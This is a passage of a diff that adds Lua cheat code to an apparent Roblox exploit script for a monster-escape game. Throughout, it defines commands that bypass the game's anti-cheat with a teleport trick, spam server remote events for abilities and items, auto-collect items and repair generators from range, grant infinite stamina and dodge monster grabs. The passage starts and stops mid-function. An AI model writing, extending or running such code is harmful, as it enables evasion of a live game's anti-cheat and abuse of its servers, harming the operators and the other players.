+					if istoon("Looey") and humanoid.Health == 1 then finalSpeed = finalSpeed + 10 end
+					humanoid.WalkSpeed = finalSpeed
+
+					local velocity = rootPart.Velocity
+					local isMoving = velocity.Magnitude > 1
+
+					if not isOldRig then
+						if isMoving and not looprunspeedlastmoving then
+							enableAnimationLoop("Run")
+						elseif not isMoving and looprunspeedlastmoving then
+							disableAnimationLoop("Run")
+						end
+					end
+
+					looprunspeedlastmoving = isMoving
+					task.wait()
+				end
+			end)
+			coroutine.resume(looprunspeedupdateloop)
+		end
+
+		newButton.MouseButton1Click:Connect(function()
+			toggled = not toggled
+			newButton.Image = toggled and image2 or image1
+
+			if toggled then
+				if infinitestaminaenabled then
+					looprunspeed()
+				else
+					game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(true)
+				end
+			else
+				if infinitestaminaenabled then
+					stoprunspeed()
+				else
+					game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(false)
+				end
+			end
+		end)
+
+		if not UserInputService.TouchEnabled then
+			UserInputService.InputBegan:Connect(function(input, gameProcessed)
+				if input.KeyCode == Enum.KeyCode.LeftShift and not gameProcessed then
+					if infinitestaminaenabled then
+						looprunspeed()
+					else
+						game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(true)
+					end
+				end
+			end)
+
+			UserInputService.InputEnded:Connect(function(input)
+				if input.KeyCode == Enum.KeyCode.LeftShift then
+					if infinitestaminaenabled then
+						stoprunspeed()
+					else
+						game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(false)
+					end
+				end
+			end)
+		end
+	end
+end)
+
+addcommand("disableinfinitestamina", "dis", function()
+	execcmd("dlrs")
+	infinitestaminaenabled = false
+	execcmd("dlrs")
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["twisted name mappings"] = {
+	["razzle & dazzle"] = {"razzledazzle", "razzleanddazzle", "razzledazzlemonster"},
+	["blot"] = {"blottmonster", "blot"},
+	["rodger"] = {"rodgermonster", "rodger"},
+}
+
+function isblacklistedtwisted(monsterName, blacklistedTwisteds)
+	monsterName = monsterName:gsub("Monster", ""):gsub("[%s&]", ""):lower()
+
+	if blacklistedTwisteds[monsterName] then
+		return true
+	end
+
+	for twistedName, patterns in pairs(noxious["twisted name mappings"]) do
+		if blacklistedTwisteds[twistedName] then
+			for _, pattern in ipairs(patterns) do
+				if monsterName:find(pattern) then
+					return true
+				end
+			end
+		end
+	end
+
+	return false
+end
+
+encounteringtwisteds = false
+
+addcommand("encountertwisteds", "et", function()
+	if encounteringtwisteds then return end
+	encounteringtwisteds = true
+
+	local haditemaura = itemauraenabled
+	local wasbypassinganticheat = bypassinganticheat
+	task.spawn(function() execcmd("eacb") end)
+
+	local blacklistedTwisteds = {}
+	local checkedBoxes = fetchchecked("Twisted Research Blacklist") or {}
+
+	for _, twistedName in ipairs(checkedBoxes) do
+		blacklistedTwisteds[twistedName:lower()] = true
+	end
+
+	local character = noxious["character"]
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")        
+	local originalPosition = humanoidRootPart.CFrame
+	task.wait(0)
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")        
+	if currentRoom then
+		workspace.Gravity = 0
+
+		local visitedRazzleDazzle = false
+
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local monstersFolder = model:FindFirstChild("Monsters")                    
+				if monstersFolder then
+					for _, monster in ipairs(monstersFolder:GetChildren()) do
+						if monster:IsA("Model") then
+							if not isblacklistedtwisted(monster.Name, blacklistedTwisteds) then
+								local yOffset = 2.5
+								if monster.Name:lower():find("rodger") then
+									yOffset = 5
+									execcmd("eia") task.wait(0.5)
+									if not haditemaura then execcmd("dia") end
+								elseif monster.Name:lower():find("razzle") and not visitedRazzleDazzle then
+									visitedRazzleDazzle = true
+									yOffset = 2.5
+									tpbypass(monster:GetModelCFrame() + Vector3.new(0, yOffset, 3))
+									workspace.Gravity = 196.2
+									noxious["replicated storage"].Events.SprintEvent:FireServer(true)
+									noxious["virtual input manager"]:SendKeyEvent(true, Enum.KeyCode.W, false, noxious["user input service"])
+									task.wait(0.5)
+									noxious["virtual input manager"]:SendKeyEvent(false, Enum.KeyCode.W, false, noxious["user input service"])
+									noxious["replicated storage"].Events.SprintEvent:FireServer(false)
+									workspace.Gravity = 0
+								end
+
+								if not monster.Name:lower():find("razzle") or not visitedRazzleDazzle then
+									tpbypass(monster:GetModelCFrame() + Vector3.new(0, yOffset, 10))
+									task.wait()
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+
+		tpbypass(originalPosition)
+		if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+		encounteringtwisteds = false
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autouseabilityrunning = false
+autouseabilityconnection = nil
+
+function doabil()
+	local args = {
+		[1] = game:GetService("Players").LocalPlayer.Character,
+		[2] = CFrame.new(-65.78115844726563, 145.7693634033203, 86.53424072265625) * CFrame.Angles(4.413669e-9, 2.9576959e-16, 5.3380848e-8),
+		[3] = false
+	}
+	game:GetService("ReplicatedStorage").Events.AbilityEvent:InvokeServer(unpack(args))
+end
+
+addcommand("enableautouseability", "eaua", function()
+	autouseabilityrunning = true
+	if autouseabilityrunning then
+		autouseabilityconnection = noxious["run service"].Heartbeat:Connect(function()
+			doabil()
+		end)
+	end
+end)
+
+addcommand("disableautouseability", "daua", function()
+	autouseabilityrunning = false
+	if autouseabilityconnection then
+		autouseabilityconnection:Disconnect()
+		autouseabilityconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["item name mappings"] = {
+	["research capsule"] = {"researchcapsule"},
+	["health kit"] = {"healthkit"},
+	["tape"] = {"tapes", "tape"},
+	["stamina candy"] = {"staminacandy"},
+	["stealth candy"] = {"stealthcandy"},
+	["speed candy"] = {"speedcandy"},
+	["protein bar"] = {"proteinbar"},
+	["ext. speed candy"] = {"extractionspeedcandy"},
+	["skill check candy"] = {"skillcheckcandy"},
+	["jumper cable"] = {"jumpercable"},
+	["air horn"] = {"airhorn"},
+	["bottle of pop"] = {"popbottle"},
+	["box of chocolates"] = {"chocolatebox"},
+	["eject button"] = {"ejectbutton"},
+	["smoke bomb"] = {"smokebomb"},
+}
+
+itemaurablacklist = {}
+itemauraenabled = false
+itemaurapprange = 30
+
+function updateitemaurablacklist()
+	itemaurablacklist = {}
+	local checkedBoxes = fetchchecked("Item Aura Blacklist") or {}
+
+	for _, itemName in ipairs(checkedBoxes) do
+		local lowerName = itemName:lower()
+		itemaurablacklist[lowerName] = true
+
+		if noxious["item name mappings"][lowerName] then
+			for _, pattern in ipairs(noxious["item name mappings"][lowerName]) do
+				itemaurablacklist[pattern] = true
+			end
+		end
+	end
+end
+
+function interac(prompt)
+	if prompt.HoldDuration == 0 then
+		prompt:InputHoldBegin()
+		prompt:InputHoldEnd()
+	else
+		prompt:InputHoldBegin()
+		task.wait(prompt.HoldDuration)
+		prompt:InputHoldEnd()
+	end
+end
+
+function itemaura()
+	if itemauraenabled then
+		updateitemaurablacklist()
+
+		local player = noxious["local player"]
+		local character = player.Character
+		if character then
+			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")                
+			if humanoidRootPart then
+				local currentRoomFolder = workspace:FindFirstChild("CurrentRoom")                    
+				if currentRoomFolder then
+					for _, model in pairs(currentRoomFolder:GetChildren()) do
+						local itemsFolder = model:FindFirstChild("Items")                        
+						if itemsFolder then
+							for _, item in pairs(itemsFolder:GetChildren()) do
+								local itemName = item.Name:lower():gsub("[%s_]", "")
+								local displayName = (item:GetAttribute("DisplayName") or ""):lower():gsub("[%s_]", "")
+								if not (itemaurablacklist[itemName] or itemaurablacklist[displayName]) then
+									local promptPart = item:FindFirstChild("Prompt")                                
+									if promptPart then
+										local proximityPrompt = promptPart:FindFirstChild("ProximityPrompt")                                        
+										if proximityPrompt and proximityPrompt.Enabled then
+											local distance = (promptPart.Position - humanoidRootPart.Position).Magnitude
+											if distance <= itemaurapprange then
+												interac(proximityPrompt)
+											end
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+
+addcommand("enableitemaura", "eia", function()
+	if not itemauraenabled then
+		itemauraenabled = true
+		updateitemaurablacklist()
+		while itemauraenabled do
+			itemaura()
+			task.wait(0)
+		end
+	end
+end)
+
+addcommand("disableitemaura", "dia", function()
+	if itemauraenabled then
+		itemauraenabled = false
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+buyAuraBlacklist = {}
+buyAuraEnabled = false
+buyAuraRange = 30
+
+function updateBuyAuraBlacklist()
+	buyAuraBlacklist = {}
+	local selected = fetchchecked("Buy Aura Blacklist") or {}
+
+	for _, itemName in ipairs(selected) do
+		local lowerName = itemName:lower()
+		buyAuraBlacklist[lowerName] = true
+
+		if noxious["item name mappings"][lowerName] then
+			for _, pattern in ipairs(noxious["item name mappings"][lowerName]) do
+				buyAuraBlacklist[pattern] = true
+			end
+		end
+	end
+end
+
+function runBuyAura()
+	if not buyAuraEnabled then return end
+
+	local localPlayer = noxious["local player"]
+	local character = localPlayer.Character
+	if not character then return end
+
+	local root = character:FindFirstChild("HumanoidRootPart")
+	if not root then return end
+
+	local elevators = workspace:FindFirstChild("Elevators")
+	if not elevators then return end
+
+	local elevator = elevators:FindFirstChild("Elevator")
+	if not elevator then return end
+
+	local dandyStore = elevator:FindFirstChild("DandyStore")
+	if not dandyStore then return end
+
+	for _, slot in ipairs(dandyStore:GetChildren()) do
+		if slot.Name:lower():match("^slot") then
+			local itemModel = slot:FindFirstChildWhichIsA("Model")
+			if itemModel then
+				local rawName = itemModel.Name:lower():gsub("[%s_]", "")
+				local displayName = (itemModel:GetAttribute("DisplayName") or ""):lower():gsub("[%s_]", "")
+
+				if not (buyAuraBlacklist[rawName] or buyAuraBlacklist[displayName]) then
+					local promptPart = itemModel:FindFirstChild("Prompt")
+					if promptPart then
+						local prompt = promptPart:FindFirstChildOfClass("ProximityPrompt")
+						if prompt and prompt.Enabled then
+							local dist = (promptPart.Position - root.Position).Magnitude
+							if dist <= buyAuraRange then
+								interac(prompt)
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+
+addcommand("enablebuyaura", "eba", function()
+	if not buyAuraEnabled then
+		buyAuraEnabled = true
+		updateBuyAuraBlacklist()
+		while buyAuraEnabled do
+			runBuyAura()
+			task.wait(0)
+		end
+	end
+end)
+
+addcommand("disablebuyaura", "dba", function()
+	buyAuraEnabled = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+gatogglestate = false
+
+function isingeneratorsfolder(prompt)
+	local Workspace = game:GetService("Workspace")
+	local currentroom = Workspace:WaitForChild("CurrentRoom")
+	local modelInRoom = currentroom:FindFirstChildWhichIsA("Model")
+	local itemsFolder = modelInRoom:WaitForChild("Generators")
+	local parent = prompt.Parent
+	while parent do
+		if parent.Parent == itemsFolder then
+			return true
+		end
+		parent = parent.Parent
+	end
+	return false
+end
+
+function con(generator)
+	local statsFolder = generator:FindFirstChild("Stats")
+	local connie = statsFolder and statsFolder:FindFirstChild("Connie")
+	return connie and connie:IsA("BoolValue") and connie.Value == true
+end
+
+function checkforgenpps()
+	local Workspace = game:GetService("Workspace")
+	local currentroom = Workspace:WaitForChild("CurrentRoom")
+	local modelInRoom = currentroom:FindFirstChildWhichIsA("Model")
+	if not modelInRoom then return end
+
+	local itemsFolder = modelInRoom:FindFirstChild("Generators")
+	if not itemsFolder then return end
+
+	for _, v in ipairs(itemsFolder:GetDescendants()) do
+		if v:IsA("ProximityPrompt") and isingeneratorsfolder(v) then
+			local generator = v:FindFirstAncestorWhichIsA("Model")
+			if generator and not con(generator) then
+				interac(v)
+			end
+		end
+	end
+end
+
+genauraenabled = false
+genauraconnection = nil
+genauracooldownactive = false
+rangeneratoraura = false
+pauseAuraThread = nil
+decodingMonitorConnection = nil
+
+local function resumeGeneratorAura()
+	if genauraenabled and not genauracooldownactive and not genauraconnection then
+		genauraconnection = noxious["run service"].Heartbeat:Connect(function()
+			checkforgenpps()
+			task.wait(0.1)
+		end)
+	end
+end
+
+function enablegeneratoraura()
+	rangeneratoraura = true
+	if genauraenabled then return end
+	genauraenabled = true
+	resumeGeneratorAura()
+
+	local player = game.Players.LocalPlayer
+	local inGamePlayer = workspace:WaitForChild("InGamePlayers"):WaitForChild(player.Name)
+	local decoding = inGamePlayer:WaitForChild("Decoding")
+
+	if decodingMonitorConnection then
+		decodingMonitorConnection:Disconnect()
+	end
+
+	decodingMonitorConnection = decoding.Changed:Connect(function(newVal)
+		if newVal == nil and not genauracooldownactive then
+			genauracooldownactive = true
+
+			if genauraconnection then
+				genauraconnection:Disconnect()
+				genauraconnection = nil
+			end
+
+			pauseAuraThread = task.spawn(function()
+				task.wait(2)
+				pauseAuraThread = nil
+				genauracooldownactive = false
+				if genauraenabled then
+					resumeGeneratorAura()
+				end
+			end)
+		end
+	end)
+end
+
+function disablegeneratoraura()
+	if not genauraenabled then return end
+	genauraenabled = false
+
+	if genauraconnection then
+		genauraconnection:Disconnect()
+		genauraconnection = nil
+	end
+
+	if decodingMonitorConnection then
+		decodingMonitorConnection:Disconnect()
+		decodingMonitorConnection = nil
+	end
+
+	if pauseAuraThread then
+		task.cancel(pauseAuraThread)
+		pauseAuraThread = nil
+		genauracooldownactive = false
+	end
+end
+
+addcommand("enablegeneratoraura", "ega", function()
+	enablegeneratoraura()
+end)
+
+addcommand("disablegeneratoraura", "dga", function()
+	disablegeneratoraura()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+isautouseitemslooprunning = true
+autouseitemsvalveused = false
+wasSpotted = false
+
+noxious["aua item categories"] = {
+	["extracting / stealth / other"] = {
+		"ExtractionSpeedCandy",
+		"Valve",
+		"JumperCable",
+		"SkillCheckCandy",
+		"StealthCandy",
+		"Jawbreaker",
+		"Gumballs",
+		"Instructions",
+	},
+
+	["healing"] = {
+		"Bandage",
+		"HealthKit",
+	},
+
+	["speed / escaping"] = {
+		"SpeedCandy",
+		"EjectButton",
+		"Chocolate",
+		"ChocolateBox",
+		"SmokeBomb",
+	},
+
+	["stamina"] = {
+		"StaminaCandy",
+		"Pop",
+		"PopBottle",
+		"ProteinBar",
+	}
+}
+
+function canuseitem(category, itemName)
+	local health = noxious["character"].Humanoid.Health
+
+	if category == "healing" then
+		if itemName == "HealthKit" then
+			return health == 1
+		elseif itemName == "Bandage" then
+			return health < 3 and health > 1
+		end
+
+	elseif category == "extracting / stealth / other" then
+		local decoding = noxious["character"]:FindFirstChild("Decoding")
+		if decoding and decoding.Value ~= nil then
+			return not autouseitemsvalveused
+		else
+			autouseitemsvalveused = false
+		end
+
+	elseif category == "stamina" then
+		local stats = noxious["character"]:FindFirstChild("Stats")
+		if stats then
+			local stamina = stats:FindFirstChild("CurrentStamina")
+			if stamina and stamina.Value < 20 then
+				return true
+			end
+		end
+
+	elseif category == "speed / escaping" then
+		return wasSpotted
+	end
+
+	return false
+end
+
+function getitemcat(itemName)
+	for category, itemList in pairs(noxious["aua item categories"]) do
+		for _, validName in pairs(itemList) do
+			if validName:lower() == itemName:lower() then
+				return category
+			end
+		end
+	end
+	return nil
+end
+
+function invokeitem(slot)
+	local itemSlot = noxious["character"]:WaitForChild("Inventory"):FindFirstChild(slot)
+	if not itemSlot then return end
+
+	local itemName = itemSlot.Value
+	if not itemName or itemName == "" then return end
+
+	if advancedautouseitems then
+		local category = getitemcat(itemName)
+		if category and canuseitem(category, itemName) then
+			noxious["replicated storage"].Events.ItemEvent:InvokeServer(noxious["character"], itemSlot)
+
+			if category == "extracting / stealth / other" and itemName == "Valve" then
+				autouseitemsvalveused = true
+			end
+		end
+	else
+		noxious["replicated storage"].Events.ItemEvent:InvokeServer(noxious["character"], itemSlot)
+	end
+end
+
+if inrun() then
+	task.spawn(function()
+		noxious["character"]:WaitForChild("Decoding"):GetPropertyChangedSignal("Value"):Connect(function()
+			if noxious["character"].Decoding.Value == nil or noxious["character"].Decoding.Value == "" or not noxious["character"].Decoding.Value then
+				autouseitemsvalveused = false
+			end
+		end)
+
+		noxious["replicated storage"].StoryEvents.Spotted.OnClientEvent:Connect(function()
+			wasSpotted = true
+			task.delay(0.5, function()
+				wasSpotted = false
+			end)
+		end)
+	end)
+end
+
+function startautouseitemsloop()
+	while isautouseitemslooprunning do
+		task.spawn(function() invokeitem("Slot1") end)
+		task.spawn(function() invokeitem("Slot2") end)
+		task.spawn(function() invokeitem("Slot3") end)
+		task.wait()
+	end
+end
+
+addcommand("enableautouseitems", "eaui", function()
+	isautouseitemslooprunning = true
+	startautouseitemsloop()
+end)
+
+addcommand("disableautouseitems", "daui", function()
+	isautouseitemslooprunning = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+--function antigrab()
+--	local wasbypassinganticheat = bypassinganticheat
+--	local hi = nil
+
+--	task.spawn(function() execcmd("eacb") end)
+
+--	local a = noxious["humanoid root part"].Velocity
+--	local b = noxious["humanoid root part"].AssemblyLinearVelocity
+
+--	noxious["humanoid root part"].Velocity = Vector3.new(0, 0, 0)
+--	noxious["humanoid root part"].AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+
+--	hi = noxious["run service"].RenderStepped:Connect(function()
+--		noxious["humanoid root part"].Anchored = true
+--	end)
+
+--	task.wait(1.8)
+--	noxious["humanoid root part"].Velocity = a
+--	noxious["humanoid root part"].AssemblyLinearVelocity = b
+--	hi:Disconnect()
+--	hi = nil
+--	noxious["humanoid root part"].Anchored = false
+--	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+--end
+
+function antigrab()
+	local wasbypassinganticheat = bypassinganticheat
+	task.spawn(function() execcmd("eacb") end)
+	local wasnoclipping = noclipping
+	task.spawn(function() execcmd("noclip") end)
+
+	game["Workspace"]["Gravity"] = 0
+	local a = noxious["humanoid root part"].CFrame
+
+	noxious["humanoid root part"].CFrame = a + CFrame.new(0, -6, 0)
+
+	task.wait(0.5)
+	noxious["humanoid root part"].CFrame = a
+	game["Workspace"]["Gravity"] = 196.2
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+	if not wasnoclipping then task.spawn(function() execcmd("clip") end) end
+end
+
+local goobMonitorConnection
+local goobChaseConnections = {}
+local goobMonitoringEnabled = false
+
+function disconnectChaseConnections()
+	for _, conn in pairs(goobChaseConnections) do
+		if typeof(conn) == "RBXScriptConnection" then
+			conn:Disconnect()
+		end
+	end
+	goobChaseConnections = {}
+end
+
+function disconnectAllMonitoring()
+	if goobMonitorConnection then
+		goobMonitorConnection:Disconnect()
+		goobMonitorConnection = nil
+	end
+	disconnectChaseConnections()
+end
+
+function startGoobMonitoring()
+	local Players = game:GetService("Players")
+	local localPlayer = Players.LocalPlayer
+
+	if goobMonitoringEnabled then return end
+	goobMonitoringEnabled = true
+
+	task.spawn(function()
+		while goobMonitoringEnabled do
+			task.wait(0)
+
+			local currentRoom = workspace:FindFirstChild("CurrentRoom")
+			if not currentRoom then continue end
+
+			local model = currentRoom:FindFirstChildWhichIsA("Model")
+			if not model then continue end
+
+			local monsters = model:FindFirstChild("Monsters")
+			if not monsters then continue end
+
+			goobMonitorConnection = monsters.ChildAdded:Connect(function(child)
+				if child.Name == "GoobMonster" then
+					local chasingVal = child:FindFirstChild("ChasingValue")
+					if chasingVal and chasingVal:IsA("ObjectValue") then
+						local conn = chasingVal:GetPropertyChangedSignal("Value"):Connect(function()
+							if chasingVal.Value == localPlayer.Name then
+								antigrab()
+							end
+						end)
+						table.insert(goobChaseConnections, conn)
+
+						if chasingVal.Value == localPlayer.Name then
+							antigrab()
+						end
+					end
+				end
+			end)
+
+			for _, child in ipairs(monsters:GetChildren()) do
+				if child.Name == "GoobMonster" then
+					local chasingVal = child:FindFirstChild("ChasingValue")
+					if chasingVal and chasingVal:IsA("ObjectValue") then
+						local conn = chasingVal:GetPropertyChangedSignal("Value"):Connect(function()
+							if chasingVal.Value == localPlayer.Name then
+								antigrab()
+							end
+						end)
+						table.insert(goobChaseConnections, conn)
+						if chasingVal.Value == localPlayer.Name then
+							antigrab()
+						end
+					end
+				end
+			end
+			break
+		end
+	end)
+end
+
+function stopGoobMonitoring()
+	if not goobMonitoringEnabled then return end
+	goobMonitoringEnabled = false
+	disconnectAllMonitoring()
+end
+
+addcommand("enableantigrab", "eag", function()
+	startGoobMonitoring()
+end)
+
+addcommand("disableantigrab", "dag", function()
+	stopGoobMonitoring()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("pathfindtogenerator", "pftg", function()
+	local pathf = game:GetService("PathfindingService")
+
+	local agent = {
+		AgentRadius = 2,
+		AgentHeight = 5,
+		AgentCanJump = false,
+	}
+
+	local function getMap()
+		return workspace.CurrentRoom:FindFirstChildWhichIsA("Model")
+	end
+
+	local map = getMap()
+	if not map then return end
+
+	local char = noxious["character"]
+	if not char or not char.PrimaryPart then return end
+
+	local generatorsFolder = map:FindFirstChild("Generators")
+	if not generatorsFolder then return end
+
+	local validGenerators = {}
+	for _, gen in pairs(generatorsFolder:GetChildren()) do
+		if gen:IsA("Model") then
+			local stats = gen:FindFirstChild("Stats")
+			local fakeValve = gen:FindFirstChild("Model") and gen.Model:FindFirstChild("FakeValve")
+
+			if stats and fakeValve then
+				local activePlayer = stats:FindFirstChild("ActivePlayer")
+				local completed = stats:FindFirstChild("Completed")
+
+				if completed and not completed.Value and (not activePlayer or activePlayer.Value == nil) then
+					table.insert(validGenerators, fakeValve.Position)
+				end
+			end
+		end
+	end
+
+	if #validGenerators == 0 then return end
+
+	local destination = validGenerators[math.random(1, #validGenerators)]
+
+	local path = pathf:CreatePath(agent)
+	local success = pcall(function()
+		path:ComputeAsync(char.PrimaryPart.Position, destination)
+	end)
+
+	if success and path.Status == Enum.PathStatus.Success then
+		local waypoints = path:GetWaypoints()
+		for _, waypoint in pairs(waypoints) do
+			repeat
+				task.wait()
+				local distance = (char.PrimaryPart.Position - waypoint.Position).Magnitude
+				char.Humanoid.WalkToPoint = waypoint.Position + Vector3.new(0.1, 0.1, 0.1) * math.random()
+			until distance < 5 or char.Decoding.Value ~= nil
+		end
+	end
+end)
+
+addcommand("pathfindtoelevator", "pfte", function()
+	local pathf = game:GetService("PathfindingService")
+
+	local agent = {
+		AgentRadius = 2,
+		AgentHeight = 5,
+		AgentCanJump = false,
+	}
+
+	local char = noxious["character"]
+	if not char or not char.PrimaryPart then return end
+
+	local elevatorsFolder = workspace:FindFirstChild("Elevators")
+	local elevatorModel = elevatorsFolder and elevatorsFolder:FindFirstChildWhichIsA("Model")
+	if not elevatorModel then return end
+
+	local blocker = elevatorModel:FindFirstChild("MonsterBlocker")
+	if not blocker then return end
+
+	local offsetCFrame = blocker.CFrame * (workspace.Info.Panic.Value and CFrame.new(0, -10.5, 0) or CFrame.new(30, -10.5, 0))
+	local destination = offsetCFrame.Position
+
+	local path = pathf:CreatePath(agent)
+	local success = pcall(function()
+		path:ComputeAsync(char.PrimaryPart.Position, destination)
+	end)
+
+	if success and path.Status == Enum.PathStatus.Success then
+		local waypoints = path:GetWaypoints()
+		for _, waypoint in pairs(waypoints) do
+			repeat
+				task.wait()
+				local distance = (char.PrimaryPart.Position - waypoint.Position).Magnitude
+				char.Humanoid.WalkToPoint = waypoint.Position + Vector3.new(0.1, 0.1, 0.1) * math.random()
+			until distance < 5 or char.Decoding.Value ~= nil
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function tpbypass(cf)
+	game.Workspace.Gravity = 0
+	local a = noxious["humanoid root part"].Velocity
+	local b = noxious["humanoid root part"].AssemblyLinearVelocity
+
+	noxious["humanoid root part"].Velocity = Vector3.new(0, 0, 0)
+	noxious["humanoid root part"].AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+
+	task.spawn(allowteleport)
+	noxious["humanoid root part"].CFrame = cf * CFrame.new(0, 3000, 0)
+
+	local function lol(r) local release = 1 if r then release = 0 end firetouchinterest(noxious["humanoid root part"], workspace.BaseplateTrigger, release) end
+	task.spawn(function() if not noxious["in studio"] then lol(true) lol(false) end end)
+	task.wait()
+
+	task.spawn(allowteleport)
+	noxious["humanoid root part"].CFrame = cf
+
+	task.wait(0.5)
+	noxious["humanoid root part"].Velocity = a
+	noxious["humanoid root part"].AssemblyLinearVelocity = b
+	game.Workspace.Gravity = 196.2
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+pickingupallitems = false
+
+addcommand("pickupallitems", "puai", function()
+	if pickingupallitems then return end
+	pickingupallitems = true
+
+	local wasnoclipping = noclipping
+	local haditemaura = itemauraenabled
+	local wasbypassinganticheat = bypassinganticheat
+
+	task.spawn(function() execcmd("eacb") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eia") end)
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local originalPosition = humanoidRootPart.CFrame
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		local itemPositions = {}
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local itemsFolder = model:FindFirstChild("Items")
+				if itemsFolder then
+					for _, item in ipairs(itemsFolder:GetChildren()) do
+						if item:IsA("Model") then
+							table.insert(itemPositions, item:GetModelCFrame())
+						end
+					end
+				end
+			end
+		end
+
+		for _, itemCFrame in ipairs(itemPositions) do
+			tpbypass(itemCFrame)
+		end
+	end
+
+	tpbypass(originalPosition)
+
+	if not wasnoclipping then task.spawn(function() task.wait(0.5) execcmd("clip") end) end
+	if not haditemaura then task.spawn(function() task.wait(0.5) execcmd("dia") end) end
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+
+	pickingupallitems = false
+end)
+
+pickingupallresearchcapsules = false
+
+addcommand("pickupallresearchcapsules", "puarc", function()
+	if pickingupallresearchcapsules then return end
+	pickingupallresearchcapsules = true
+
+	local wasnoclipping = noclipping
+	local haditemaura = itemauraenabled
+	local wasbypassinganticheat = bypassinganticheat
+
+	task.spawn(function() execcmd("eacb") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eia") end)
+
+	local blacklistedTwisteds = {}
+	local checkedBoxes = fetchchecked("Twisted Research Blacklist") or {}
+	for _, twistedName in ipairs(checkedBoxes) do
+		blacklistedTwisteds[twistedName:lower()] = true
+	end
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local originalPosition = humanoidRootPart.CFrame
+
+	tpbypass(originalPosition)
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		local itemPositions = {}
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local itemsFolder = model:FindFirstChild("Items")
+				if itemsFolder then
+					for _, item in ipairs(itemsFolder:GetChildren()) do
+						if item:IsA("Model") and item.Name == "ResearchCapsule" then
+							local shouldCollect = true
+
+							local prompt = item:FindFirstChild("Prompt")
+							if prompt then
+								local monsterString = prompt:FindFirstChild("Monster")
+								if monsterString and monsterString:IsA("StringValue") then
+									local monsterName = monsterString.Value
+									if isblacklistedtwisted(monsterName, blacklistedTwisteds) then
+										shouldCollect = false
+									end
+								end
+							end
+
+							if shouldCollect then
+								table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, 0, 0))
+							end
+						end
+					end
+				end
+			end
+		end
+
+		for _, itemCFrame in ipairs(itemPositions) do
+			tpbypass(itemCFrame)
+		end
+	end
+
+	tpbypass(originalPosition)
+
+	if not wasnoclipping then task.spawn(function() task.wait(0.5) execcmd("clip") end) end
+	if not haditemaura then task.spawn(function() task.wait(0.5) execcmd("dia") end) end
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+
+	pickingupallresearchcapsules = false
+end)
+
+pickingupalltapes = false
+
+addcommand("pickupalltapes", "puat", function()
+	if pickingupalltapes then return end
+	pickingupalltapes = true
+
+	local wasnoclipping = noclipping
+	local haditemaura = itemauraenabled
+	local wasbypassinganticheat = bypassinganticheat
+
+	task.spawn(function() execcmd("eacb") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eia") end)
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local originalPosition = humanoidRootPart.CFrame
+
+	tpbypass(originalPosition)
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		local itemPositions = {}
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local itemsFolder = model:FindFirstChild("Items")
+				if itemsFolder then
+					for _, item in ipairs(itemsFolder:GetChildren()) do
+						if item:IsA("Model") and item.Name == "Tape" then
+							-- table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
+							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, 0, 0))
+						end
+					end
+				end
+			end
+		end
+
+		for _, itemCFrame in ipairs(itemPositions) do
+			tpbypass(itemCFrame)
+		end
+	end
+
+	tpbypass(originalPosition)
+
+	if not wasnoclipping then task.spawn(function() task.wait(0.5) execcmd("clip") end) end
+	if not haditemaura then task.spawn(function() task.wait(0.5) execcmd("dia") end) end
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+
+	pickingupalltapes = false
+end)
+
+pickingupallheals = false
+
+addcommand("pickupallheals", "puah", function()
+	if pickingupallheals then return end
+	pickingupallheals = true
+
+	local wasnoclipping = noclipping
+	local haditemaura = itemauraenabled
